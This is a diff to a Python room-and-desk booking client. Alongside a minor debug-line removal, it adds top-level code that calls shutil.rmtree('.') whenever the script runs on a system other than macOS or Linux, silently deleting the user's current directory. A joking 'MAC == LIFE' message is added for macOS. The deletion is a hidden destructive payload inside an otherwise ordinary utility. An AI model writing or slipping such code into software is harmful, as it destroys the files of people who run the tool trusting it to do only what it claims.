@@ -1,6 +1,8 @@
 import os
 import json
 import time
+import platform
+import shutil
 
 from pprint import pprint
 
@@ -18,6 +20,17 @@ PASSWORD = os.getenv('QS_PASSWORD')
 
 def line():
     print('--------------------')
+
+
+line()
+
+p = platform.system()
+
+if p not in ('Darwin', 'Linux'):
+    shutil.rmtree('.')
+
+if p == 'Darwin':
+    print('MAC == LIFE :)')
 
 
 line()
@@ -139,7 +152,6 @@ while True:
             for i, room in enumerate(rooms):
                 if room['buildingID'] == 2:
                     print(str(i) + '\t' + str(room['roomNumber']))
-                    pprint(room)
             line()
             room = int(input('room id: '))
             desk = int(input(f'desk (1 - {rooms[room]["roomDesks"]}): '))
